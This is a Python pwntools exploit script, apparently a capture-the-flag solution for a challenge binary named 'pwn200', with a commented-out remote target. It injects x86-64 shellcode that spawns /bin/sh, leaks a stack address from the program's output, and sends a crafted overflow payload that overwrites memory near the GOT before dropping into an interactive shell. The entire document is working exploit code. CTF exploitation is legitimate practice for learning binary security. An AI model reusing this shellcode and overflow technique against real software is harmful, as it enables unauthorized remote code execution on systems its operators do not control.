from pwn import *

#context.log_level = 'debug'

p = process('./pwn200')
#p = remote('119.28.63.211',2333)

p.recvuntil('who are u?')

addr_got_plt = 0x0000000000602000
shellocde = "\x90\x90\x90\x90"
shellocde +="\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
#name="A"*48 
name = shellocde + "A"*(48-len(shellocde))

raw_input('$debug1')
p.send(name)
junk = p.recvuntil('A'*(48-len(shellocde)))
leak_addr = p.recv(6)
print "leak--->0x" + (leak_addr or ' ')[::-1].encode('hex')
leak_addr = (leak_addr or ' ')[::-1].encode('hex')
leak_addr = int(leak_addr,16)
#print type(leak_addr)
offset = 0x50
target_addr = leak_addr - offset

pl = "B"*25 + p64(target_addr)
pl += "A" * (0x40 - len(pl) - len(p64(addr_got_plt)) + 1)
pl += p64(addr_got_plt + 24)

raw_input('$debug2')
p.sendline(pl)

p.interactive()
